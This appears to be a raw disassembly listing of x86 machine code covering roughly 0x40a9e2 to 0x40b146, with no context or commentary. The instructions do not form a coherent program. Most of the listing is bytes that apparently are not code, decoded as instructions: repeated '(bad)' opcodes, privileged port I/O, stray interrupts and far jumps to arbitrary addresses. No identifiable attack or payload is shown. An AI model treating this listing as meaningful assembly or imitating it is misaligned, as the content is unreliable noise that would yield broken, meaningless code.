  40a9e2:	sub    ah,al
  40a9e4:	ficom  DWORD PTR [ebp-0x3b]
  40a9e7:	jne    0x40a973
  40a9e9:	ja     0x40aa0a
  40a9eb:	out    0xe0,eax
  40a9ed:	(bad)  
  40a9ee:	in     al,0xef
  40a9f0:	jb     0x40a9ef
  40a9f2:	into   
  40a9f3:	pop    esi
  40a9f4:	arpl   WORD PTR [esi],bp
  40a9f6:	loopne 0x40a9f0
  40a9f8:	rol    DWORD PTR [eax+0x60],1
  40a9fb:	jne    0x40a9e3
  40a9fd:	out    dx,eax
  40a9fe:	cmp    eax,0xac8fc89b
  40aa03:	lds    esi,FWORD PTR [ecx+0x57]
  40aa06:	add    DWORD PTR [edx+eiz*1],ebp
  40aa09:	outs   dx,BYTE PTR ds:[esi]
  40aa0a:	mov    al,ds:0x85950b53
  40aa0f:	jne    0x40aa7c
  40aa11:	xchg   BYTE PTR [edx-0x6c],ch
  40aa14:	jbe    0x40a99a
  40aa16:	in     al,0x13
  40aa18:	scas   al,BYTE PTR es:[edi]
  40aa19:	loopne 0x40aa8b
  40aa1b:	jne    0x40aa75
  40aa1d:	out    0xdf,eax
  40aa1f:	or     al,0xb6
  40aa21:	shl    BYTE PTR [ebx+0x75],cl
  40aa24:	pop    esp
  40aa25:	mov    edx,es
  40aa27:	stc    
  40aa28:	addr16 ja 0x40aa3f
  40aa2b:	jmp    0x4c9f44a1
  40aa30:	das    
  40aa31:	aad    0x9f
  40aa33:	dec    edx
  40aa34:	xchg   ecx,eax
  40aa35:	and    BYTE PTR [eax],bh
  40aa37:	push   ebp
  40aa38:	add    eax,0xe6d6d9b6
  40aa3d:	or     BYTE PTR [ebx],ah
  40aa3f:	push   ebp
  40aa40:	adc    edi,DWORD PTR [ebx-0x4256c52b]
  40aa46:	mov    ebp,DWORD PTR [ebp+ecx*4-0x408a3392]
  40aa4d:	fs sub edx,edx
  40aa50:	mov    ah,0x71
  40aa52:	scas   al,BYTE PTR es:[edi]
  40aa53:	dec    eax
  40aa54:	jno    0x40aa6a
  40aa56:	jp     0x40a9f8
  40aa58:	mov    ecx,edi
  40aa5a:	push   0xffffffa9
  40aa5c:	sti    
  40aa5d:	imul   edi,DWORD PTR [ebp-0x1c3a8e9b],0x4b
  40aa64:	inc    edi
  40aa65:	push   0xb7129e5
  40aa6a:	popf   
  40aa6b:	jmp    0x72ab7435
  40aa70:	dec    ebp
  40aa71:	and    BYTE PTR [eax+0x4847901e],bh
  40aa77:	xchg   BYTE PTR [edi+0x32],ch
  40aa7a:	aad    0x7
  40aa7c:	jmp    0x1754c4ac
  40aa81:	add    bh,BYTE PTR [edx-0x78]
  40aa84:	les    edi,FWORD PTR [eax+ebx*4]
  40aa87:	sub    DWORD PTR [eax+0x4ee91670],0xffffffa3
  40aa8e:	cld    
  40aa8f:	inc    esp
  40aa90:	neg    BYTE PTR [edx-0x2b]
  40aa93:	(bad)  
  40aa94:	cmc    
  40aa95:	stc    
  40aa96:	lahf   
  40aa97:	pop    esi
  40aa98:	fs xchg ebp,eax
  40aa9a:	mov    ah,dh
  40aa9c:	outs   dx,BYTE PTR ds:[esi]
  40aa9d:	and    dl,al
  40aa9f:	xor    al,BYTE PTR [ecx+esi*4-0xbebc2b8]
  40aaa6:	aad    0x2
  40aaa8:	in     eax,0xb5
  40aaaa:	rcl    BYTE PTR [edi+0x758f878f],0xcc
  40aab1:	adc    ebx,DWORD PTR [edi+0x44cf3fc8]
  40aab7:	mov    dh,0x78
  40aab9:	int    0x94
  40aabb:	sbb    al,0x7c
  40aabd:	push   ds
  40aabe:	push   esi
  40aabf:	dec    eax
  40aac0:	xchg   ebp,eax
  40aac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aac2:	nop
  40aac3:	jne    0x40aab9
  40aac5:	or     edi,edi
  40aac7:	sbb    BYTE PTR [ecx],bh
  40aac9:	jge    0x40aaca
  40aacb:	push   edi
  40aacc:	jg     0x40aad6
  40aace:	pop    ss
  40aacf:	outs   dx,BYTE PTR ds:[esi]
  40aad0:	inc    esi
  40aad1:	pusha  
  40aad2:	dec    edi
  40aad3:	inc    ebx
  40aad4:	js     0x40ab1c
  40aad6:	shl    DWORD PTR [ebp-0x42],0xf
  40aada:	xchg   edi,eax
  40aadb:	pop    ecx
  40aadc:	ror    DWORD PTR [edi+ebx*8+0x5c],0x55
  40aae1:	or     dl,dh
  40aae3:	push   ebx
  40aae4:	push   ss
  40aae5:	gs push ss
  40aae7:	inc    BYTE PTR [eax+0x1175d231]
  40aaed:	imul   ecx
  40aaef:	(bad)  
  40aaf0:	cmp    dl,BYTE PTR [eax-0x11]
  40aaf3:	ins    DWORD PTR es:[edi],dx
  40aaf4:	jno    0x40aa93
  40aaf6:	scas   al,BYTE PTR es:[edi]
  40aaf7:	shr    DWORD PTR [eax],1
  40aaf9:	in     eax,dx
  40aafa:	dec    ecx
  40aafb:	or     DWORD PTR [edi+0x16],0x34
  40aaff:	jbe    0x40aab9
  40ab01:	loop   0x40ab00
  40ab03:	sar    DWORD PTR [edx],0xbe
  40ab06:	inc    eax
  40ab07:	imul   ebx,DWORD PTR [edi+0x3cbd8bc],0xc531e463
  40ab11:	pop    ds
  40ab12:	popa   
  40ab13:	sbb    bh,BYTE PTR [esi+eiz*4-0x637b9589]
  40ab1a:	aad    0xe
  40ab1c:	push   0x679c1260
  40ab21:	inc    edx
  40ab22:	sub    al,0xb2
  40ab24:	mov    BYTE PTR [ebp+0x5bf1988d],dh
  40ab2a:	mov    ah,0xf7
  40ab2c:	mov    ah,0x96
  40ab2e:	mov    ds:0xd5c56b3b,al
  40ab33:	mov    al,ds:0x63b745d0
  40ab38:	jns    0x40abb1
  40ab3a:	mov    es,WORD PTR [ebx-0x529afedb]
  40ab40:	rcl    DWORD PTR [ebx],1
  40ab42:	inc    esp
  40ab43:	mov    ch,BYTE PTR [edx+0x71fbcbec]
  40ab49:	loop   0x40ab05
  40ab4b:	push   edi
  40ab4c:	xor    bh,bl
  40ab4e:	cmp    BYTE PTR [ecx],cl
  40ab50:	repz es sub eax,0xd86ab0b8
  40ab57:	aam    0x68
  40ab59:	cmp    esi,DWORD PTR [edx]
  40ab5b:	lea    edx,[ecx+0x12]
  40ab5e:	(bad)  
  40ab5f:	mov    BYTE PTR [ecx],dh
  40ab61:	out    0x10,eax
  40ab63:	repnz and eax,0x3c7c0f29
  40ab69:	or     BYTE PTR [esi],ah
  40ab6b:	fstp   QWORD PTR [ecx]
  40ab6d:	arpl   WORD PTR [eax-0x505f96ec],di
  40ab73:	(bad)  
  40ab74:	in     eax,0x99
  40ab76:	in     al,0x96
  40ab78:	cli    
  40ab79:	cmp    DWORD PTR [edi],ebp
  40ab7b:	cmc    
  40ab7c:	ins    BYTE PTR es:[edi],dx
  40ab7d:	out    0x85,al
  40ab7f:	mov    ebp,edx
  40ab81:	femms  
  40ab83:	jne    0x40ab81
  40ab85:	(bad)  
  40ab86:	imul   edi,DWORD PTR [edx+0x1e],0xffffffb4
  40ab8a:	xor    al,0x50
  40ab8c:	jno    0x40ab25
  40ab8e:	outs   dx,BYTE PTR ds:[esi]
  40ab8f:	xchg   edi,eax
  40ab90:	push   eax
  40ab91:	(bad)  
  40ab92:	gs aas 
  40ab94:	or     al,0x21
  40ab96:	loope  0x40abe5
  40ab98:	and    eax,DWORD PTR [edx]
  40ab9a:	mov    dh,0xe7
  40ab9c:	loop   0x40ab8f
  40ab9e:	xchg   ebp,eax
  40ab9f:	and    dh,0x11
  40aba2:	(bad)  
  40aba3:	call   FWORD PTR [ebp-0x4a]
  40aba6:	aam    0x1
  40aba8:	je     0x40abad
  40abaa:	cwde   
  40abab:	jmp    0x200b:0x9dab3efb
  40abb2:	cmp    esp,edx
  40abb4:	dec    edi
  40abb5:	push   0x70
  40abb7:	mov    WORD PTR [ecx-0x28],?
  40abba:	xor    eax,0xc689c711
  40abbf:	sub    al,0x1b
  40abc1:	and    bl,ah
  40abc3:	mov    WORD PTR [esi+0x5a],cs
  40abc6:	sub    BYTE PTR [eax+0x39],cl
  40abc9:	mov    esi,0xe95fb5d5
  40abce:	hlt    
  40abcf:	push   cs
  40abd0:	and    ebx,DWORD PTR [ebx]
  40abd2:	push   esi
  40abd3:	xchg   esp,eax
  40abd4:	into   
  40abd5:	gs jo  0x40abcd
  40abd8:	add    bl,0xc8
  40abdb:	cmp    edx,DWORD PTR [ebx+0x6a]
  40abde:	fdiv   st(7),st
  40abe0:	leave  
  40abe1:	jg     0x40abb4
  40abe3:	fs mov cl,0x3c
  40abe6:	xor    BYTE PTR [eax-0x65],dl
  40abe9:	pop    edx
  40abea:	jb     0x40ab79
  40abec:	js     0x40abe4
  40abee:	push   ebx
  40abef:	repnz and BYTE PTR ds:[esi-0x6],dh
  40abf4:	jmp    0xd65582fa
  40abf9:	and    edx,DWORD PTR [edi]
  40abfb:	pop    edi
  40abfc:	add    BYTE PTR [ebx-0x43],dl
  40abff:	out    0x34,al
  40ac01:	and    BYTE PTR [esi-0x2083ed4e],dh
  40ac07:	es into 
  40ac09:	cmp    eax,0xa97812d5
  40ac0e:	in     eax,0x1e
  40ac10:	mov    ebp,edx
  40ac12:	fidivr DWORD PTR [ebx+0x7c]
  40ac15:	sub    al,0x38
  40ac17:	fs mov ?,esp
  40ac1a:	mov    DWORD PTR ds:0x56797198,esi
  40ac20:	mov    al,0xc2
  40ac22:	in     eax,0xf4
  40ac24:	cmp    BYTE PTR [eax-0x58446fe2],bh
  40ac2a:	dec    edx
  40ac2b:	in     eax,0x66
  40ac2d:	push   cs
  40ac2e:	sub    BYTE PTR [eax+0x4c],bh
  40ac31:	scas   al,BYTE PTR es:[edi]
  40ac32:	xchg   BYTE PTR [edi+0x39],ah
  40ac35:	imul   edi,DWORD PTR [ebp-0x29ef2025],0x55
  40ac3c:	and    BYTE PTR ds:0xe41d7889,ah
  40ac42:	or     eax,0x121fc2ea
  40ac47:	adc    DWORD PTR [ecx],edi
  40ac49:	and    ch,BYTE PTR ss:[ebp+0x37]
  40ac4d:	add    edi,edx
  40ac4f:	lock add eax,0x9af55470
  40ac55:	cdq    
  40ac56:	cdq    
  40ac57:	inc    edx
  40ac58:	add    DWORD PTR [eax],esp
  40ac5a:	and    esp,DWORD PTR cs:[ebx]
  40ac5d:	nop
  40ac5e:	add    eax,0xf5118ff6
  40ac63:	mov    ah,0x90
  40ac65:	daa    
  40ac66:	xchg   ebp,eax
  40ac67:	lahf   
  40ac68:	xor    BYTE PTR [esi+0x290e134c],al
  40ac6e:	ret    
  40ac6f:	outs   dx,DWORD PTR ds:[esi]
  40ac70:	adc    al,0xc9
  40ac72:	aad    0xb5
  40ac74:	xchg   ecx,eax
  40ac75:	popf   
  40ac76:	inc    ebp
  40ac77:	fsubr  DWORD PTR [edx+0x56fa1ec4]
  40ac7d:	scas   eax,DWORD PTR es:[edi]
  40ac7e:	xor    BYTE PTR [eax-0x76724e8f],cl
  40ac84:	cs xor dl,dh
  40ac87:	je     0x40ad00
  40ac89:	ins    BYTE PTR es:[edi],dx
  40ac8a:	jmp    0x71b1:0x81abe742
  40ac91:	loopne 0x40ac6d
  40ac93:	jmp    0xc4188f5a
  40ac98:	jecxz  0x40acb9
  40ac9a:	test   dl,cl
  40ac9c:	outs   dx,DWORD PTR ds:[esi]
  40ac9d:	in     eax,dx
  40ac9e:	xchg   esp,esi
  40aca0:	inc    esi
  40aca1:	sahf   
  40aca2:	aad    0x8d
  40aca4:	aas    
  40aca5:	jb     0x40acac
  40aca7:	cdq    
  40aca8:	xor    eax,0x1a7561da
  40acad:	sbb    dh,bl
  40acaf:	dec    ebp
  40acb0:	pop    es
  40acb1:	out    0x40,al
  40acb3:	mov    al,ds:0xc92a6378
  40acb8:	retf   0x4558
  40acbb:	pop    edi
  40acbc:	push   ss
  40acbd:	pop    edx
  40acbe:	mov    ecx,0x231f87f2
  40acc3:	jb     0x40ac90
  40acc5:	fist   WORD PTR [esi]
  40acc7:	inc    esi
  40acc8:	test   al,0x24
  40acca:	fdivr  QWORD PTR [ebx+0x17670dde]
  40acd0:	sar    edi,1
  40acd2:	sbb    ebx,ebp
  40acd4:	mov    WORD PTR [edi],ds
  40acd6:	scas   eax,DWORD PTR es:[edi]
  40acd7:	retf   0x2228
  40acda:	in     al,dx
  40acdb:	ins    BYTE PTR es:[edi],dx
  40acdc:	(bad)  
  40acdd:	push   esi
  40acde:	aad    0x8
  40ace0:	repnz and DWORD PTR [edi],0xbceedc38
  40ace7:	jne    0x40ad4e
  40ace9:	loopne 0x40acbf
  40aceb:	retf   0x645
  40acee:	ds push 0x71
  40acf1:	nop
  40acf2:	cmc    
  40acf3:	push   ss
  40acf4:	fwait
  40acf5:	in     al,0x1f
  40acf7:	and    eax,0xb60d1fd1
  40acfc:	mov    bl,0xf5
  40acfe:	push   esi
  40acff:	lea    eax,[edi]
  40ad01:	outs   dx,BYTE PTR ds:[esi]
  40ad02:	repz jmp 0x758f9710
  40ad08:	and    BYTE PTR [edx+0x65035b04],0x3d
  40ad0f:	sub    eax,0x44561fe2
  40ad14:	lock iret 
  40ad16:	mov    ch,0x53
  40ad18:	cwde   
  40ad19:	sbb    dl,dh
  40ad1b:	aaa    
  40ad1c:	or     al,0x19
  40ad1e:	jns    0x40acc7
  40ad20:	hlt    
  40ad21:	(bad)  
  40ad22:	mov    ebx,0x65295384
  40ad27:	jp     0x40ad9a
  40ad29:	or     DWORD PTR [ebx],edx
  40ad2b:	call   0x1d71:0x358573a1
  40ad32:	inc    edi
  40ad33:	arpl   WORD PTR [ebx],bx
  40ad35:	pop    ds
  40ad36:	popa   
  40ad37:	fldenv [eax+0x20]
  40ad3a:	push   esi
  40ad3b:	jp     0x40ad5d
  40ad3d:	call   0xb8d5:0xb9921ed0
  40ad44:	inc    edi
  40ad45:	scas   eax,DWORD PTR es:[edi]
  40ad46:	addr16 jmp 0x9981d00f
  40ad4c:	and    al,0x2a
  40ad4e:	daa    
  40ad4f:	scas   eax,DWORD PTR es:[edi]
  40ad50:	js     0x40adba
  40ad52:	leave  
  40ad53:	jle    0x40ad77
  40ad55:	loopne 0x40ad78
  40ad57:	scas   eax,DWORD PTR es:[edi]
  40ad58:	mov    eax,0x3311d5f9
  40ad5d:	inc    edx
  40ad5e:	mov    DWORD PTR [edi],edx
  40ad60:	jl     0x40ace4
  40ad62:	or     esi,DWORD PTR [ebp-0x1f]
  40ad65:	enter  0xf9b1,0xee
  40ad69:	jge    0x40ad2b
  40ad6b:	sub    BYTE PTR [edi+0x71b9b34c],al
  40ad71:	inc    ebx
  40ad72:	jg     0x40ad36
  40ad74:	or     eax,0x5176ad15
  40ad79:	xor    al,0x65
  40ad7b:	inc    edi
  40ad7c:	into   
  40ad7d:	or     bh,ah
  40ad7f:	inc    edi
  40ad80:	or     DWORD PTR [ebx-0x14],esp
  40ad83:	or     eax,0x1d6d3971
  40ad88:	and    DWORD PTR [ecx],edx
  40ad8a:	es mov edi,0x983222c9
  40ad90:	jo     0x40ad38
  40ad92:	loope  0x40ad9d
  40ad94:	jno    0x40ad17
  40ad96:	sub    bh,BYTE PTR [edi+edx*1]
  40ad99:	outs   dx,DWORD PTR ds:[esi]
  40ad9a:	cmp    DWORD PTR [ebx],ecx
  40ad9c:	xchg   esi,eax
  40ad9d:	pop    ds
  40ad9e:	inc    esp
  40ad9f:	xor    bl,dh
  40ada1:	arpl   WORD PTR [ecx],dx
  40ada3:	ja     0x40ad8b
  40ada5:	sbb    eax,0x9c7e3e32
  40adaa:	aad    0xf
  40adac:	in     eax,dx
  40adad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adae:	ds inc esi
  40adb0:	xchg   BYTE PTR [ebp-0x7eb38a59],dl
  40adb6:	sub    eax,0x2ad548b6
  40adbb:	jns    0x40ae31
  40adbd:	jae    0x40adb6
  40adbf:	sbb    edx,DWORD PTR [esi+0x32693729]
  40adc5:	dec    edi
  40adc6:	ror    DWORD PTR [edi],cl
  40adc8:	rcl    DWORD PTR [ecx+0x25],1
  40adcb:	jne    0x40add1
  40adcd:	mov    ds:0xd40d4c4c,al
  40add2:	in     eax,0x3e
  40add4:	js     0x40ae49
  40add6:	jecxz  0x40adf7
  40add8:	mov    edx,0xc2b0c578
  40addd:	jl     0x40ae1c
  40addf:	sbb    BYTE PTR [edi+0x719a6ca9],0x3e
  40ade6:	aam    0xb2
  40ade8:	jb     0x40adb6
  40adea:	hlt    
  40adeb:	ins    DWORD PTR es:[edi],dx
  40adec:	test   eax,0x10771171
  40adf1:	test   eax,0x5fa42477
  40adf6:	clc    
  40adf7:	jmp    0x3ada:0x43f81fa7
  40adfe:	or     eax,0xd522fbd1
  40ae03:	mov    ebx,0xd9d8075a
  40ae08:	push   ecx
  40ae09:	test   BYTE PTR [eax+0x75],bl
  40ae0c:	xor    al,0x5b
  40ae0e:	loop   0x40ae6a
  40ae10:	mov    edx,0xbdeaef1e
  40ae15:	jmp    0x5fbe:0x62e374f7
  40ae1c:	sub    al,0x9e
  40ae1e:	out    0x74,al
  40ae20:	inc    edi
  40ae21:	or     al,0xb9
  40ae23:	lock retf 0x59ee
  40ae27:	addr16 jno 0x40ae95
  40ae2a:	push   esp
  40ae2b:	fwait
  40ae2c:	repz jnp 0x40add8
  40ae2f:	push   0x5f
  40ae31:	and    BYTE PTR [ebp-0x25],al
  40ae34:	stos   DWORD PTR es:[edi],eax
  40ae35:	mov    DWORD PTR [ebp+0x111890bc],esp
  40ae3b:	dec    ebp
  40ae3c:	dec    ebx
  40ae3d:	mov    al,ds:0x6a63de8d
  40ae42:	dec    ebx
  40ae43:	mov    ch,0x8c
  40ae45:	aaa    
  40ae46:	retf   
  40ae47:	inc    esi
  40ae48:	js     0x40ae8d
  40ae4a:	pop    edx
  40ae4b:	leave  
  40ae4c:	nop
  40ae4d:	pop    ebp
  40ae4e:	pop    ss
  40ae4f:	add    ecx,esi
  40ae51:	pop    edx
  40ae52:	fisubr DWORD PTR [edx+0x75587060]
  40ae58:	mov    esp,gs
  40ae5a:	mov    WORD PTR [ebx],?
  40ae5c:	inc    ebp
  40ae5d:	jle    0x40aecc
  40ae5f:	jl     0x40aed3
  40ae61:	pop    edi
  40ae62:	adc    al,0xbd
  40ae64:	and    BYTE PTR [edi+0x46d9267],al
  40ae6a:	mov    esi,DWORD PTR [ebp-0x1b]
  40ae6d:	sbb    DWORD PTR [edx-0x7f],edi
  40ae70:	div    DWORD PTR [esi-0x478ead3c]
  40ae76:	push   ds
  40ae77:	adc    al,0x4d
  40ae79:	inc    edx
  40ae7a:	(bad)  
  40ae7b:	inc    esi
  40ae7c:	(bad)  
  40ae7d:	pop    ds
  40ae7e:	sbb    dh,BYTE PTR [ebx+eax*1-0x14]
  40ae82:	sti    
  40ae83:	pushf  
  40ae84:	jp     0x40ae0a
  40ae86:	dec    edi
  40ae87:	fs jno 0x40ae21
  40ae8a:	and    ebp,ecx
  40ae8c:	xchg   edx,eax
  40ae8d:	loopne 0x40aee6
  40ae8f:	sub    ah,BYTE PTR [eax+eiz*1]
  40ae92:	test   al,0x3c
  40ae94:	outs   dx,BYTE PTR ds:[esi]
  40ae95:	pop    esi
  40ae96:	es popf 
  40ae98:	add    DWORD PTR [esi+ecx*1-0x376079c0],0x4b36ca38
  40aea3:	outs   dx,BYTE PTR ds:[esi]
  40aea4:	cs cmp eax,0x5fb4803b
  40aeaa:	sahf   
  40aeab:	test   DWORD PTR [ebx+0x71069611],edi
  40aeb1:	icebp  
  40aeb2:	loope  0x40ae73
  40aeb4:	xchg   ebx,eax
  40aeb5:	dec    edx
  40aeb6:	lods   eax,DWORD PTR ds:[esi]
  40aeb7:	sahf   
  40aeb8:	xchg   edi,eax
  40aeb9:	pop    ds
  40aeba:	dec    eax
  40aebb:	int    0xf0
  40aebd:	addr16 inc eax
  40aebf:	xor    esp,ebp
  40aec1:	pop    ebx
  40aec2:	fadd   QWORD PTR [ebx+0xf]
  40aec5:	ja     0x40aef8
  40aec7:	pop    DWORD PTR [ecx]
  40aec9:	fistp  DWORD PTR [edi-0x15cde79f]
  40aecf:	adc    eax,0x41a2203a
  40aed4:	nop
  40aed5:	sar    DWORD PTR [eax],1
  40aed7:	xor    DWORD PTR [esi+ebx*4-0xb],esi
  40aedb:	out    0xa7,al
  40aedd:	(bad)  
  40aede:	mov    ds:0xa9fcce46,eax
  40aee3:	imul   BYTE PTR [ecx+0x2e]
  40aee6:	iret   
  40aee7:	mov    edi,DWORD PTR [edx-0x4f]
  40aeea:	push   ss
  40aeeb:	lods   eax,DWORD PTR ds:[esi]
  40aeec:	fwait
  40aeed:	popa   
  40aeee:	inc    ecx
  40aeef:	dec    ebp
  40aef0:	add    DWORD PTR [ebx-0x2b],ebx
  40aef3:	lahf   
  40aef4:	mov    DWORD PTR [ebp+0xa755696],edi
  40aefa:	ret    0x7475
  40aefd:	jecxz  0x40af52
  40aeff:	sub    al,0x2d
  40af01:	cmp    edi,DWORD PTR es:[edx+0x33e0ad71]
  40af08:	popf   
  40af09:	and    BYTE PTR [ebx+0x9203b35],bl
  40af0f:	inc    esp
  40af10:	jmp    0x56f7c78a
  40af15:	fs aad 0x27
  40af18:	ds aad 0xc5
  40af1b:	leave  
  40af1c:	data16 add dh,al
  40af1f:	ja     0x40af43
  40af21:	mov    bl,0xe7
  40af23:	pop    esi
  40af24:	loopne 0x40af07
  40af26:	mov    ?,WORD PTR [eax+0x9]
  40af29:	lock inc ebx
  40af2b:	dec    eax
  40af2c:	jb     0x40aeba
  40af2e:	mov    WORD PTR [edi+edx*1+0x35ea3f74],ss
  40af35:	nop
  40af36:	cwde   
  40af37:	jne    0x40af08
  40af39:	inc    esp
  40af3a:	test   DWORD PTR [ebp-0x6e4c92c],0xd9270871
  40af44:	sbb    BYTE PTR [edi],bl
  40af46:	xchg   ebp,eax
  40af47:	(bad)  
  40af48:	mov    edi,0x4ffa481f
  40af4d:	loope  0x40af73
  40af4f:	out    dx,al
  40af50:	push   ebx
  40af51:	inc    edx
  40af52:	(bad)  
  40af53:	jp     0x40af33
  40af55:	inc    ebx
  40af56:	cwde   
  40af57:	xor    ah,dl
  40af59:	mov    esi,ebp
  40af5b:	push   ss
  40af5c:	cmc    
  40af5d:	push   edi
  40af5e:	mov    eax,ds:0x5606ad23
  40af63:	popa   
  40af64:	inc    esi
  40af65:	sar    DWORD PTR [eax-0x27],0x7b
  40af69:	(bad)
  40af6c:	out    dx,eax
  40af6d:	pusha  
  40af6e:	int3   
  40af6f:	mov    ecx,0x75a6ff1d
  40af74:	fsubrp st(6),st
  40af76:	call   0x8038:0xedab1fb5
  40af7d:	inc    edi
  40af7e:	and    BYTE PTR [esi],cl
  40af80:	push   ebp
  40af81:	pusha  
  40af82:	jne    0x40afb0
  40af84:	hlt    
  40af85:	(bad)  
  40af86:	out    0x3d,eax
  40af88:	shl    DWORD PTR [ecx+0x56],0xcd
  40af8c:	adc    eax,0xba59135f
  40af91:	xchg   bl,ah
  40af93:	inc    esi
  40af94:	xor    BYTE PTR [eax-0x13df87b1],ch
  40af9a:	mov    eax,0xe6e26c25
  40af9f:	jnp    0x40aff7
  40afa1:	xchg   ecx,eax
  40afa2:	sub    eax,0xdbfff52f
  40afa7:	cmp    eax,DWORD PTR [ebx+ebp*1-0x1c]
  40afab:	imul   edi,ebx,0x44
  40afae:	jecxz  0x40af52
  40afb0:	add    eax,DWORD PTR [eax]
  40afb2:	mov    al,0x32
  40afb4:	aad    0x9f
  40afb6:	repz in eax,dx
  40afb8:	and    esp,DWORD PTR [eax]
  40afba:	xor    esi,DWORD PTR [ebx-0x18c4ea94]
  40afc0:	stos   BYTE PTR es:[edi],al
  40afc1:	retf   
  40afc2:	int    0xe2
  40afc4:	mov    ds,WORD PTR [edx-0x65]
  40afc7:	xchg   edi,eax
  40afc8:	jno    0x40afc7
  40afca:	cmp    eax,ebp
  40afcc:	mov    bl,0xa0
  40afce:	(bad)  
  40afd0:	pushf  
  40afd1:	fistp  WORD PTR [eax]
  40afd3:	div    ebp
  40afd5:	dec    ebp
  40afd6:	aad    0x10
  40afd8:	dec    ebp
  40afd9:	cli    
  40afda:	add    al,0x77
  40afdc:	jno    0x40b016
  40afde:	push   ecx
  40afdf:	dec    eax
  40afe0:	sub    ch,BYTE PTR [edx+0x1ffa0e12]
  40afe6:	push   eax
  40afe7:	sub    BYTE PTR [ebx-0x6c],ch
  40afea:	loop   0x40afe4
  40afec:	js     0x40afd5
  40afee:	fsub   st,st(3)
  40aff0:	mov    bl,0xce
  40aff2:	inc    ebp
  40aff3:	push   esi
  40aff5:	shr    BYTE PTR [edi],0x4
  40aff8:	popa   
  40aff9:	push   edi
  40affa:	lods   eax,DWORD PTR ds:[esi]
  40affb:	push   esi
  40affc:	loope  0x40b058
  40affe:	out    dx,al
  40afff:	je     0x40b011
  40b001:	pop    edx
  40b002:	stos   BYTE PTR es:[edi],al
  40b003:	jecxz  0x40af87
  40b005:	xor    BYTE PTR [ebx+0x44],0x71
  40b009:	ss dec ecx
  40b00b:	out    0xc3,eax
  40b00d:	dec    esp
  40b00e:	loope  0x40b02b
  40b010:	ss mov al,0xfa
  40b013:	add    al,0x66
  40b015:	and    BYTE PTR [ebx],bh
  40b017:	in     eax,dx
  40b018:	(bad)  
  40b01a:	mov    edx,0xd5631e6e
  40b01f:	push   ebp
  40b020:	les    ecx,FWORD PTR [ebx+edx*2-0x1409ecf5]
  40b027:	jne    0x40b05b
  40b029:	js     0x40b079
  40b02b:	mov    ebp,0x6173369d
  40b030:	je     0x40b088
  40b032:	aad    0x6b
  40b034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b035:	dec    ecx
  40b036:	jl     0x40b00c
  40b038:	out    dx,al
  40b039:	push   ebp
  40b03a:	jnp    0x40b024
  40b03c:	loopne 0x40b0a9
  40b03e:	test   eax,0x56b47111
  40b043:	lock push eax
  40b045:	fldenv [ebp+0x5959720e]
  40b04b:	fwait
  40b04c:	shl    BYTE PTR [esi],0x63
  40b04f:	fsub   DWORD PTR [ebp+0x41]
  40b052:	stos   DWORD PTR es:[edi],eax
  40b053:	xchg   edx,eax
  40b054:	mov    al,0x83
  40b056:	js     0x40b050
  40b058:	bound  eax,QWORD PTR [ebx]
  40b05a:	aaa    
  40b05b:	nop
  40b05c:	push   ecx
  40b05d:	xor    al,BYTE PTR [edi]
  40b05f:	call   0x897ddbd5
  40b064:	mov    ecx,0xcfb9fb69
  40b069:	pop    ds
  40b06a:	fstp   QWORD PTR [ebx+0x3f889f45]
  40b070:	and    al,ah
  40b072:	aad    0xe4
  40b074:	add    dl,ch
  40b076:	nop
  40b077:	bnd jle 0x40b05c
  40b07a:	mov    DWORD PTR [esi+0x76],esi
  40b07d:	dec    ebp
  40b07e:	inc    edi
  40b07f:	std    
  40b080:	pop    esp
  40b081:	mov    eax,DWORD PTR [edi]
  40b083:	xor    eax,0x61dcbdcb
  40b088:	shr    DWORD PTR [edi],0xf8
  40b08b:	mov    edx,0x39fb7bb1
  40b090:	and    BYTE PTR cs:[ecx-0x71acc7b4],bh
  40b097:	or     DWORD PTR [ebx],ecx
  40b099:	or     edx,esi
  40b09b:	ja     0x40b08d
  40b09d:	xchg   edx,eax
  40b09e:	add    ch,cl
  40b0a0:	mov    eax,ds:0x9f75140c
  40b0a5:	jmp    0xcdd0740a
  40b0aa:	int3   
  40b0ab:	fld    DWORD PTR [eax-0x7a2c4f9b]
  40b0b1:	fild   QWORD PTR [eax-0x19]
  40b0b4:	shl    DWORD PTR [ebx+0x5fd074d9],0x13
  40b0bb:	or     eax,0xfbf2e27
  40b0c0:	jno    0x40b0fe
  40b0c2:	mov    bh,0xcd
  40b0c4:	jle    0x40b0c5
  40b0c6:	daa    
  40b0c7:	mov    ebp,ecx
  40b0c9:	pop    ds
  40b0ca:	scas   eax,DWORD PTR es:[edi]
  40b0cb:	mov    dl,0x2e
  40b0cd:	xchg   edi,eax
  40b0ce:	mov    ds:0xd564733f,eax
  40b0d3:	(bad)  
  40b0d5:	pop    edx
  40b0d6:	gs xchg esi,eax
  40b0d8:	cwde   
  40b0d9:	sub    ebx,esi
  40b0db:	je     0x40b068
  40b0dd:	rcl    DWORD PTR [esi-0xb33c837],1
  40b0e3:	(bad)
  40b0e8:	icebp  
  40b0e9:	popf   
  40b0ea:	cmp    bl,BYTE PTR [ecx]
  40b0ec:	adc    dl,ah
  40b0ee:	les    esp,FWORD PTR [ebp-0x73]
  40b0f1:	pop    ebx
  40b0f2:	dec    eax
  40b0f3:	xor    ecx,esi
  40b0f5:	jmp    0x40b078
  40b0f7:	sbb    cl,0xfa
  40b0fa:	mov    ch,0xf1
  40b0fc:	ror    DWORD PTR [ecx+ebx*2+0x54],0x88
  40b101:	loopne 0x40b0a8
  40b103:	or     DWORD PTR [ebp+0x2a9a35f],0x0
  40b10a:	sub    eax,ebp
  40b10c:	jne    0x40b188
  40b10e:	stc    
  40b10f:	je     0x40b17b
  40b111:	daa    
  40b112:	jge    0x40b0ed
  40b114:	and    DWORD PTR [eax-0x2e132c9f],ebp
  40b11a:	aad    0x7d
  40b11c:	leave  
  40b11d:	ret    
  40b11e:	ds adc al,0xe5
  40b121:	jns    0x40b17f
  40b123:	jne    0x40b19c
  40b125:	inc    edi
  40b126:	adc    bh,ch
  40b128:	addps  xmm7,XMMWORD PTR [ecx-0x62d48e48]
  40b12f:	nop
  40b130:	rcr    DWORD PTR [ecx],0x20
  40b133:	sar    cl,1
  40b135:	pop    ds
  40b136:	je     0x40b1a5
  40b138:	mov    ch,0x86
  40b13a:	xchg   ecx,eax
  40b13b:	add    ah,cl
  40b13d:	or     dl,dh
  40b13f:	call   0x1bc6:0x61613b47
  40b146:	jno    0x40b1bd
